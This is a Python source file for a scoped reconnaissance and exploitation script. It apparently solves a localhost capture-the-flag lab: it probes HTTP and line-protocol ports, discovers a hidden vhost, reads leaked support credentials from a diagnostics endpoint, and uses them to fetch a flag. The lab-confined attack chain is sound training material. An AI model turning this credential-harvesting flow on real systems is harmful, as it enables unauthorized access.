import sys
import json
import socket
import hashlib
import base64
import time
from pathlib import Path
from datetime import datetime, timezone
from engine.scope import Scope


total_requests = 0
max_requests = 240
rate_per_sec = 25
last_request_time = 0

def acquire_request():
    global total_requests, last_request_time
    if total_requests >= max_requests:
        raise RuntimeError(f"Request budget exhausted ({max_requests} max)")
    # Enforce rate limiting
    now = time.time()
    if last_request_time > 0:
        elapsed = now - last_request_time
        min_interval = 1.0 / rate_per_sec
        if elapsed < min_interval:
            time.sleep(min_interval - elapsed)
    last_request_time = time.time()
    total_requests += 1
    return total_requests


def load_checkpoint(output_dir):
    cp_file = Path(output_dir) / "checkpoint.json"
    if cp_file.exists():
        try:
            with open(cp_file) as f:
                data = json.load(f)
                # Return full dict; missing fields default to empty
                return data
        except:
            return {}
    return {}

def save_checkpoint(output_dir, state):
    cp_file = Path(output_dir) / "checkpoint.json"
    with open(cp_file, 'w') as f:
        json.dump(state, f, indent=2)



def probe_http(host, port, scope, timeout=5, path="/", host_header=None):
    if not scope.is_allowed(host, port):
        raise PermissionError(f"Scope denied: {host}:{port}")
    acquire_request()  # <-- count this request
    raw_response = ""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            if host_header is None:
                host_header = host
            request = f"GET {path} HTTP/1.1\r\nHost: {host_header}\r\nConnection: close\r\n\r\n"
            sock.sendall(request.encode())
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                raw_response += chunk.decode(errors='ignore')
        lines = raw_response.split('\r\n')
        status_line = lines[0] if lines else ""
        status_code = 0
        if " " in status_line:
            parts = status_line.split(' ')
            if len(parts) >= 2:
                try:
                    status_code = int(parts[1])
                except ValueError:
                    pass
        return {
            "raw": raw_response,
            "status_code": status_code,
            "headers": "\r\n".join(lines[1:]) if len(lines) > 1 else "",
            "body": raw_response.split('\r\n\r\n', 1)[1] if '\r\n\r\n' in raw_response else "",
        }
    except Exception as e:
        return {"raw": f"ERROR: {e}", "status_code": 0, "headers": "", "body": "", "error": str(e)}

def probe_line(host, port, scope, timeout=5):
    if not scope.is_allowed(host, port):
        raise PermissionError(f"Scope denied: {host}:{port}")
    acquire_request()
    raw_data = ""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            data = sock.recv(1024)
            raw_data = data.decode(errors='ignore')
        return {"raw": raw_data, "line": raw_data.strip()}
    except Exception as e:
        return {"raw": f"ERROR: {e}", "line": "", "error": str(e)}

def send_line_command(host, port, command, timeout=5):
    """Send a command to line protocol. Counts request."""
    acquire_request()
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            banner = sock.recv(1024).decode(errors='ignore')
            sock.sendall((command + "\r\n").encode())
            data = sock.recv(1024)
            response = data.decode(errors='ignore').strip()
            return {"banner": banner.strip(), "response": response}
    except Exception as e:
        return {"error": str(e)}

def detect_wildcard_http(host, port, scope, timeout=5, samples=3):
    """Check if HTTP endpoint returns same response for random hostnames."""
    baseline = probe_http(host, port, scope, timeout, path="/")
    if baseline.get("error") or baseline.get("status_code", 0) == 0:
        return {"error": "Baseline failed", "is_wildcard": False}
    body_hash = hashlib.sha256(baseline.get("body", "").encode()).hexdigest()
    baseline_info = {"status": baseline.get("status_code", 0), "length": len(baseline.get("body", "")), "body_hash": body_hash}
    test_hosts = [f"random-{i}.invalid" for i in range(samples)]
    unique = []
    for test_host in test_hosts:
        result = probe_http(host, port, scope, timeout, path="/", host_header=test_host)
        if result.get("error"):
            continue
        test_hash = hashlib.sha256(result.get("body", "").encode()).hexdigest()
        if (result.get("status_code") != baseline_info["status"] or
            test_hash != baseline_info["body_hash"] or
            len(result.get("body", "")) != baseline_info["length"]):
            unique.append({"host_header": test_host, "status": result.get("status_code"), "body_hash": test_hash, "raw": result.get("raw", "")[:500]})
    is_wildcard = len(unique) == 0
    return {"baseline": baseline_info, "is_wildcard": is_wildcard, "unique_responses": unique, "sample_count": len(unique)}


def write_assets_jsonl(results, output_path):
    assets_file = output_path / "normalized" / "assets.jsonl"
    with open(assets_file, 'w') as f:
        now = datetime.now(timezone.utc).isoformat()
        if "http" in results and results["http"].get("status", 0) > 0:
            http = results["http"]
            record = {
                "observed_at": now,
                "target": "127.0.0.1",
                "port": http["port"],
                "protocol": "tcp",
                "service": "http",
                "source_tool": "engine.socket",
                "source_file": http.get("raw_file", ""),
                "confidence": "high",
                "notes": f"HTTP status {http['status']}",
                "status": http["status"],
                "headers": http.get("headers", "")[:200]
            }
            f.write(json.dumps(record) + "\n")
        if "line" in results:
            line = results["line"]
            record = {
                "observed_at": now,
                "target": "127.0.0.1",
                "port": line["port"],
                "protocol": "tcp",
                "service": "unknown-line",
                "source_tool": "engine.socket",
                "source_file": line.get("raw_file", ""),
                "confidence": "medium",
                "notes": f"Line: {line.get('line', '')[:100]}",
            }
            f.write(json.dumps(record) + "\n")
        if "flag" in results:
            flag = results["flag"]
            record = {
                "observed_at": now,
                "type": "flag",
                "value": flag.get("value", ""),
                "source": flag.get("source", ""),
                "raw_file": flag.get("raw_file", "")
            }
            f.write(json.dumps(record) + "\n")

def write_errors_jsonl(errors, output_path):
    errors_file = output_path / "errors.jsonl"
    with open(errors_file, 'w') as f:
        for err in errors:
            f.write(json.dumps(err) + "\n")

def write_report_html(results, output_path):
    report_file = output_path / "report.html"
    timestamp = datetime.now(timezone.utc).isoformat()
    html = f"""<!DOCTYPE html>
<html>
<head><title>Recon Engine Report</title>
<style>
body {{ font-family: monospace; padding: 20px; }}
table {{ border-collapse: collapse; width: 100%; }}
th, td {{ border: 1px solid #ccc; padding: 8px; text-align: left; }}
th {{ background: #f0f0f0; }}
</style>
</head>
<body>
<h1>Recon Engine – Scan Report</h1>
<p>Generated: {timestamp}</p>
<h2>Discovered Assets</h2>
<table>
<tr><th>Target</th><th>Port</th><th>Protocol</th><th>Service</th><th>Notes</th></tr>
"""
    if "http" in results and results["http"].get("status", 0) > 0:
        h = results["http"]
        html += f"<tr><td>127.0.0.1</td><td>{h['port']}</td><td>tcp</td><td>http</td><td>Status {h['status']}</td></tr>\n"
    else:
        html += "<tr><td>127.0.0.1</td><td>18231</td><td>tcp</td><td>http</td><td>No response (check lab)</td></tr>\n"

    if "line" in results:
        l = results["line"]
        html += f"<tr><td>127.0.0.1</td><td>{l['port']}</td><td>tcp</td><td>line</td><td>{l.get('line', '')[:60]}</td></tr>\n"
    else:
        html += "<tr><td>127.0.0.1</td><td>23420</td><td>tcp</td><td>line</td><td>No response</td></tr>\n"

    if "flag" in results:
        flag = results["flag"]
        html += f"<tr><td>FLAG</td><td>---</td><td>---</td><td>foothold</td><td>{flag.get('value', '')[:60]}</td></tr>\n"

    html += """</table>
</body>
</html>"""
    with open(report_file, 'w') as f:
        f.write(html)


def run(target, scope_path, output_dir, rate):
    global rate_per_sec, total_requests, last_request_time
    rate_per_sec = rate
    total_requests = 0
    last_request_time = 0

    print(f"\n[+] Loading scope from: {scope_path}")
    try:
        scope = Scope(scope_path)
        allowed_ports = scope.get_allowed_ports()
        print(f"[+] Scope loaded. Authorized endpoints:")
        for port in allowed_ports:
            print(f"    - 127.0.0.1:{port}")
    except Exception as e:
        print(f"[-] FATAL: Failed to load scope: {e}", file=sys.stderr)
        sys.exit(1)

    if target not in ('127.0.0.1', 'localhost'):
        print(f"[-] FATAL: Target must be 127.0.0.1 (got {target})", file=sys.stderr)
        sys.exit(1)

    output_path = Path(output_dir)
    http_raw_dir = output_path / "raw" / "http"
    line_raw_dir = output_path / "raw" / "line"
    flag_raw_dir = output_path / "raw" / "flag"
    normalized_dir = output_path / "normalized"
    for d in [http_raw_dir, line_raw_dir, flag_raw_dir, normalized_dir]:
        d.mkdir(parents=True, exist_ok=True)

    print(f"\n[+] Output directory structure ready at: {output_path}")
    print(f"[+] Rate limit: {rate} req/s, Budget: {max_requests} requests")

    # Load enhanced checkpoint
    cp_state = load_checkpoint(output_dir)
    completed_steps = set(cp_state.get("completed_steps", []))
    discovered_vhost = cp_state.get("discovered_vhost")
    route_proof = cp_state.get("route_proof")
    if "total_requests" in cp_state:
        total_requests = cp_state["total_requests"]
        print(f"[+] Restored request count: {total_requests}")
    if discovered_vhost:
        print(f"[+] Resuming with vhost: {discovered_vhost}")
    if route_proof:
        print(f"[+] Resuming with route proof: {route_proof}")

    results = {}
    errors = []

    # 1. HTTP baseline + wildcard detection on port 18231
    if 18231 in allowed_ports:
        if "http_18231" not in completed_steps:
            print("[+] Probing HTTP target on port 18231...")
            try:
                wildcard_info = detect_wildcard_http(target, 18231, scope)
            except RuntimeError as e:
                print(f"[-] Budget exhausted: {e}")
                # Stop gracefully – we'll skip further steps
                sys.exit(1)
            if wildcard_info.get("error"):
                print(f"    Wildcard detection error: {wildcard_info['error']}")
                http_result = probe_http(target, 18231, scope, path="/")
                if http_result and not http_result.get("error"):
                    results["http"] = {"port": 18231, "status": http_result.get("status_code", 0), "raw_file": str(http_raw_dir / "18231_baseline.txt")}
                    with open(http_raw_dir / "18231_baseline.txt", 'w') as f:
                        f.write(http_result.get("raw", ""))
            else:
                if wildcard_info["is_wildcard"]:
                    print("    [⚠] Endpoint appears to be a wildcard – will try discovered vhost later")
                    results["http_wildcard"] = {"port": 18231, "baseline": wildcard_info["baseline"], "is_wildcard": True}
                    baseline_raw = probe_http(target, 18231, scope, path="/")
                    if baseline_raw and not baseline_raw.get("error"):
                        with open(http_raw_dir / "18231_baseline.txt", 'w') as f:
                            f.write(baseline_raw.get("raw", ""))
                else:
                    print(f"    [✓] Found {wildcard_info['sample_count']} unique responses")
                    unique = wildcard_info["unique_responses"][0]
                    results["http"] = {"port": 18231, "status": unique["status"], "host_header": unique["host_header"], "raw_file": str(http_raw_dir / "18231_vhost.txt")}
                    with open(http_raw_dir / "18231_vhost.txt", 'w') as f:
                        f.write(unique.get("raw", ""))
                    discovered_vhost = unique["host_header"]
            completed_steps.add("http_18231")
            save_checkpoint(output_dir, {
                "completed_steps": list(completed_steps),
                "discovered_vhost": discovered_vhost,
                "route_proof": route_proof,
                "total_requests": total_requests
            })
        else:
            print("[+] HTTP port 18231 already probed – skipping (checkpoint)")

    # 2. Line protocol on port 23420
    if 23420 in allowed_ports:
        if "line_23420" not in completed_steps:
            print("[+] Probing line-protocol target on port 23420...")
            try:
                line_result = probe_line(target, 23420, scope)
            except RuntimeError as e:
                print(f"[-] Budget exhausted: {e}")
                sys.exit(1)
            if line_result and not line_result.get("error"):
                results["line"] = {"port": 23420, "line": line_result.get("line", ""), "raw_file": str(line_raw_dir / "23420_banner.txt")}
                with open(line_raw_dir / "23420_banner.txt", 'w') as f:
                    f.write(line_result.get("raw", ""))
                print(f"    Line received: {line_result.get('line', '')[:50]}...")
            else:
                errors.append({"timestamp": datetime.now(timezone.utc).isoformat(), "port": 23420, "error": line_result.get("error", "Unknown error")})
            completed_steps.add("line_23420")
            save_checkpoint(output_dir, {
                "completed_steps": list(completed_steps),
                "discovered_vhost": discovered_vhost,
                "route_proof": route_proof,
                "total_requests": total_requests
            })
        else:
            print("[+] Line port 23420 already probed – skipping (checkpoint)")

    # 3. Discovery via line protocol (CAPS, ROUTE)
    if 23420 in allowed_ports and "line_discovery" not in completed_steps:
        print("\n[+] Discovering service details via line protocol...")
        try:
            caps = send_line_command(target, 23420, "CAPS")
        except RuntimeError as e:
            print(f"[-] Budget exhausted: {e}")
            sys.exit(1)
        if caps.get("error"):
            errors.append({"timestamp": datetime.now(timezone.utc).isoformat(), "step": "CAPS", "error": caps["error"]})
            print(f"    CAPS error: {caps['error']}")
        else:
            print(f"    CAPS response: {caps.get('response', '')[:80]}...")
            try:
                route_resp = send_line_command(target, 23420, "ROUTE")
            except RuntimeError as e:
                print(f"[-] Budget exhausted: {e}")
                sys.exit(1)
            if route_resp.get("error"):
                errors.append({"timestamp": datetime.now(timezone.utc).isoformat(), "step": "ROUTE", "error": route_resp["error"]})
                print(f"    ROUTE error: {route_resp['error']}")
            else:
                route_str = route_resp.get("response", "")
                print(f"    ROUTE response: {route_str[:80]}...")
                parts = route_str.split(';')
                for p in parts:
                    p = p.strip()
                    if p.startswith("route="):
                        discovered_vhost = p.split("=", 1)[1].strip()
                    elif p.startswith("proof="):
                        route_proof = p.split("=", 1)[1].strip()
                if discovered_vhost:
                    print(f"    Discovered vhost: {discovered_vhost}")
                if route_proof:
                    print(f"    Discovered route proof: {route_proof}")
        completed_steps.add("line_discovery")
        save_checkpoint(output_dir, {
            "completed_steps": list(completed_steps),
            "discovered_vhost": discovered_vhost,
            "route_proof": route_proof,
            "total_requests": total_requests
        })
    else:
        print("[+] Line discovery already done – skipping")

    # 4. Use discovered vhost to probe HTTP and get flag
    if discovered_vhost and 18231 in allowed_ports and "http_vhost" not in completed_steps:
        print(f"\n[+] Probing HTTP with discovered vhost: {discovered_vhost}")
        # robots.txt
        try:
            robots = probe_http(target, 18231, scope, path="/robots.txt", host_header=discovered_vhost)
        except RuntimeError as e:
            print(f"[-] Budget exhausted: {e}")
            sys.exit(1)
        if robots and not robots.get("error"):
            with open(http_raw_dir / "robots.txt", 'w') as f:
                f.write(robots.get("raw", ""))
            print(f"    /robots.txt status {robots.get('status_code')}")
        else:
            print("    /robots.txt not available")

        # ops-diagnostics
        try:
            diag = probe_http(target, 18231, scope, path="/ops-diagnostics", host_header=discovered_vhost)
        except RuntimeError as e:
            print(f"[-] Budget exhausted: {e}")
            sys.exit(1)
        diag_data = {}
        if diag and not diag.get("error") and diag.get("status_code") == 200:
            with open(http_raw_dir / "ops-diagnostics.json", 'w') as f:
                f.write(diag.get("raw", ""))
            try:
                diag_data = json.loads(diag.get("body", "{}"))
            except:
                pass
            if diag_data:
                print(f"    /ops-diagnostics: support_user={diag_data.get('support_user')}, signal_port={diag_data.get('signal_service')}")

        # flag retrieval
        if diag_data and route_proof:
            username = diag_data.get("support_user")
            password = diag_data.get("support_password")
            if username and password:
                auth_str = f"{username}:{password}"
                b64_auth = base64.b64encode(auth_str.encode()).decode('ascii')
                headers = {
                    "Authorization": f"Basic {b64_auth}",
                    "X-Route-Key": route_proof
                }
                try:
                    acquire_request()  # count this final request
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(5)
                        sock.connect((target, 18231))
                        req = (
                            f"GET /user.txt HTTP/1.1\r\n"
                            f"Host: {discovered_vhost}\r\n"
                            f"Authorization: {headers['Authorization']}\r\n"
                            f"X-Route-Key: {headers['X-Route-Key']}\r\n"
                            f"Connection: close\r\n\r\n"
                        )
                        with open(flag_raw_dir / "http_request.txt", 'w') as f:
                            f.write(req)
                        sock.sendall(req.encode())
                        data = b""
                        while True:
                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            data += chunk
                        raw = data.decode(errors='ignore')
                        with open(flag_raw_dir / "http_response.txt", 'w') as f:
                            f.write(raw)
                        lines = raw.split('\r\n')
                        status_line = lines[0] if lines else ""
                        status = 0
                        if " " in status_line:
                            parts = status_line.split(' ')
                            if len(parts) >= 2:
                                try:
                                    status = int(parts[1])
                                except:
                                    pass
                        if status == 200:
                            body = raw.split('\r\n\r\n', 1)[1] if '\r\n\r\n' in raw else ""
                            flag_value = body.strip()
                            if flag_value.startswith("UBI-EH-A1-"):
                                results["flag"] = {"value": flag_value, "source": "/user.txt with auth", "raw_file": str(flag_raw_dir / "http_response.txt")}
                                with open(flag_raw_dir / "flag.txt", 'w') as f:
                                    f.write(flag_value)
                                print(f"    [✓] FLAG FOUND: {flag_value}")
                        else:
                            print(f"    /user.txt returned status {status}")
                except RuntimeError as e:
                    print(f"[-] Budget exhausted: {e}")
                    sys.exit(1)
                except Exception as e:
                    print(f"    Error fetching /user.txt: {e}")
            else:
                print("    Missing credentials")
        else:
            print("    Missing route proof or diag data – cannot fetch /user.txt")

        completed_steps.add("http_vhost")
        save_checkpoint(output_dir, {
            "completed_steps": list(completed_steps),
            "discovered_vhost": discovered_vhost,
            "route_proof": route_proof,
            "total_requests": total_requests
        })
    else:
        print("[+] HTTP vhost probing already done – skipping")

    # Write output files
    write_assets_jsonl(results, output_path)
    write_errors_jsonl(errors, output_path)
    write_report_html(results, output_path)

    # run.json
    run_meta = {
        "start_time": datetime.now(timezone.utc).isoformat(),
        "target": target,
        "scope_file": str(scope_path),
        "output_dir": str(output_path),
        "rate_limit": rate,
        "total_requests": total_requests,
        "results": results
    }
    run_json_path = output_path / "run.json"
    with open(run_json_path, 'w') as f:
        json.dump(run_meta, f, indent=2)

    print(f"\n[+] Done! Used {total_requests} requests out of {max_requests}.")
    print(f"    - run.json        : {run_json_path}")
    print(f"    - assets.jsonl    : {output_path / 'normalized' / 'assets.jsonl'}")
    print(f"    - errors.jsonl    : {output_path / 'errors.jsonl'}")
    print(f"    - report.html     : {output_path / 'report.html'}")
    print(f"    - checkpoint.json : {output_path / 'checkpoint.json'}")
    if "flag" in results:
        print(f"    [✓] Foothold flag captured: {results['flag']['value']}")
